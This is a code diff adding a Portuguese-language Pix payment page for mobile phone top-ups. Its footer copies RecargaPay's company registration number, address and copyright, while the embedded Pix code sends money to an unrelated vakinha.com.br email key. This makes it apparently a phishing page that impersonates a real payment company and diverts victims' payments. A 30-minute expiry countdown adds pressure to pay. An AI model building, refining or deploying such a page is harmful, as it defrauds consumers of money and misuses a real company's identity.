@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento via Pix</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        .header {
+            background-color: #dda0dd;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .header img {
+            width: 150px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+        .container {
+            padding: 20px;
+            position: relative;
+        }
+        .info-box {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            text-align: left;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .timer-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 1.2em;
+            color: #87CEEB;
+        }
+        .qrcode {
+            width: 200px;
+            height: 200px;
+            border: 1px solid #ccc;
+            margin: 20px auto;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .pix-key {
+            margin: 20px auto;
+            padding: 10px;
+            width: 300px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            text-align: left;
+            display: inline-block;
+            overflow: hidden;
+        }
+        .pix-key p {
+            margin: 10px 0;
+            word-wrap: break-word; /* Quebra de linha para longas chaves */
+        }
+        .copy-button {
+            padding: 10px;
+            background-color: #ff69b4; /* Rosa */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 1em;
+        }
+        .copy-button:hover {
+            background-color: #ff1493; /* Rosa escuro */
+        }
+        .info-table {
+            margin: 20px auto;
+            width:  100%;
+            max-width: 100%;
+            border-collapse: collapse;
+        }
+        .info-table td {
+            padding: 10px;
+            border: 1px solid #ccc;
+            text-align: left;
+        }
+        .info-table .label {
+            font-weight: bold;
+            width: 50%;
+        }
+        .info-table .value {
+            width: 50%;
+            text-align: right;
+        }
+        .footer {
+            background-color: #ff69b4; /* Rosa */
+            color: white;
+            text-align: center;
+            padding: 20px 10px;
+            margin-top: 20px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+        .checkbox-container {
+            margin: 20px auto;
+            width: 300px;
+            text-align: left;
+            display: inline-block;
+        }
+        .checkbox-container label {
+            font-size: 1em;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="Operadoras.png" alt="Operadoras">
+    </div>
+
+    <div class="container">
+        <div class="info-box">
+            <h2>Instruções para Escanear o QR Code</h2>
+            <p>1. Abra o aplicativo de pagamento do seu banco.</p>
+            <p>2. Selecione a opção para pagar com QR Code.</p>
+            <p>3. Aponte a câmera para o QR Code exibido abaixo.</p>
+            <p>4. Confirme o valor e finalize o pagamento.</p>
+        </div>
+
+        <div class="timer-container">
+            <p><strong>O código expira em:</strong> <span id="expiracao">30:00</span></p>
+        </div>
+
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAR0AAAEdAQMAAAALpCE4AAAABlBMVEX///8AAABVwtN+AAAACXBIWXMAAA7EAAAOxAGVKw4bAAADUUlEQVRoge1aQY6jQBCriAPHPIGfJB8bCaR8DH7CEzhyQKm1XSSweYFnlD50EtpzKNrldlVPxHd8x58f18x8xk/X4nNuc/mJ9XZ95BqYMAZfED74tB3xY70vETlhins+5lp1BSGS2+v1tyOerlq/YMqnPUibsXVcYpxNrpel+QUgkmrk3pBUeIj1MdxB5BOpdFl6pkQjZnV41nyQzg3EDL4+Zubtx/SR5magGuQTpoouESem+BxeIEVSzC/hzLjj2xq1Vb4grIs2UB1mMMQeoJ6JEF2ppykIfFoZDndkXl8JPbdM3kxjEN9+RJ8MjHmLHVGIN0b3DGdQVzmQxaKezMK2THQIYQyi9ExLgymHrp14qI5MjgC92hOf7EDRzyEbMzKwu0B4tge2i70lCPTnASUqMZzaJe1NHNLjB7pu1Jqg6vSpbzI0GGcL6QiCul/k12nCdErJw4NeIT9sCwKBWGNQ7ANKCcW/XYcKVkhnkJL3SdCUG2PqmdBb9190biBqesKgyzOq7uChRXgiQ95OzBCkt0+rXuXo1mmXEJ3O3fAFwRIwW0UlaGaWLxDo8AWOINmYgUopuSwJ3Q3Nm0+GIK0jHKRsU3UHhBO2ci85BlsQrRepFHelMas6el/lwBrOIGYwEqG8L/lUZbWq7MP7OoKo8w+2AiCSanfRDbALINk3BjFv5R5TxRFAKRHSuesLosyMmIikUrJrRJPDrtHhxAxB5XizbG/9TbU0eMa+yyRHEKq6KEvAEHVAsU6l2Mcpzf1Auy9gt6VTZxSr0v7GHIQT6Z3B0v5ikQpsZxDXKTNQSoIweDZVbX1un9qBXkipO8zuzqcqPsYIYxA1fWODsZ/VlWZCU45kGAZfUMNGC/1X7saxjFmZ4sNC+oFQWTxDDgZ+ndmwxr43J5/pCOpTIarS4091eEuJ4lSS2IFoeynxoejy3RQY5cQOX2AHKiQrpEXtCwQ2sQugamMyBtUtLpbYnaMlkAgpxPl92WgJGth3/qkL3NcFRvOqNpxBr3Y/r4eKT7xOjFLPxRxEVzPKErBMGotKWxz3La6gq9pdlbKsU6sXo6PKFzTU3cpa/67AXNY9KB3CB+nMQMxg+QISSM0XXtfp7uLci7YDfcd3/OnxD4PNm7EZwLI7AAAAAElFTkSuQmCC">
+
+        <div class="pix-key">
+            <p id="pix-key">Chave Pix: 00020126720014br.gov.bcb.pix0129mailto:4239993@vakinha.com.br0217Compra segura pix5204000053039865802BR5914Recarga online6015Recarga de celu62070503***6304201A</p>
+            <button class="copy-button" onclick="copiarChave()">Copiar Chave Pix</button>
+        </div>
+
+        <div class="checkbox-container">
+            <label>
+                <input type="checkbox" id="nota-fiscal">
+                Enviar nota fiscal pelo e-mail
+            </label>
+        </div>
+
+        <div class="info-box">
+            <h2>Detalhes do Pedido</h2>
+            <table class="info-table">
+                <tr>
+                    <td class="label">Operadora:</td>
+                    <td class="value" id="operadora"></td>
+                </tr>
+                <tr>
+                    <td class="label">Valor:</td>
+                    <td class="value" id="valor"></td>
+                </tr>
+                <tr>
+                    <td class="label">Telefone:</td>
+                    <td class="value" id="telefone"></td>
+                </tr>
+                <tr>
+                    <td class="label">E-mail:</td>
+                    <td class="value" id="email"></td>
+                </tr>
+            </table>
+            <p><strong>Informações de Pagamento:</strong> Pagamento via Pix.</p>
+            <p><strong>Proteção de Dados:</strong> Seus dados estão protegidos de acordo com a Lei Geral de Proteção de Dados (LGPD).</p>
+        </div>
+    </div>
+
+      <div class="footer">
+        <p><div class="media-body"> 
+      <p>CNPJ: 11.275.560/0001-75. Endereço: Avenida Brigadeiro Faria Lima, nº 4055, 1º andar, sala 1-114, Espaço WeWork - Sala RecargaPay, Itaim Bibi, São&nbsp;Paulo/SP, CEP 04538-133</address> 
+      <p>Copyright ©2024 RecargaPay Instituição de Pagamento Ltda. Todos&nbsp;os&nbsp;direitos&nbsp;reservados.</p> 
+     </div></p>
+    </div>
+
+    <script>
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                operadora: params.get('operadora'),
+                valor: params.get('valor'),
+                telefone: params.get('telefone'),
+                email: params.get('email')
+            };
+        }
+
+        function displayData() {
+            const data = getQueryParams();
+            document.getElementById('operadora').textContent = data.operadora;
+            document.getElementById('valor').textContent = data.valor;
+            document.getElementById('telefone').textContent = data.telefone;
+            document.getElementById('email').textContent = data.email;
+        }
+
+        function iniciarTemporizador() {
+            let tempo = 30 * 60; // 30 minutos em segundos
+            const temporizador = document.getElementById('expiracao');
+
+            function atualizarTemporizador() {
+                const minutos = Math.floor(tempo / 60);
+                const segundos = tempo % 60;
+                temporizador.textContent = `${minutos}:${segundos.toString().padStart(2, '0')}`;
+                if (tempo > 0) {
+                    tempo--;
+                    setTimeout(atualizarTemporizador, 1000);
+                }
+            }
+
+            atualizarTemporizador();
+        }
+
+        function copiarChave() {
+            const chave = document.getElementById('pix-key').textContent.replace('Chave Pix: ', '');
+            navigator.clipboard.writeText(chave).then(() => {
+                alert('Chave Pix copiada para a área de transferência.');
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            displayData();
+            iniciarTemporizador();
+        });
+    </script>
+</body>
+</html>
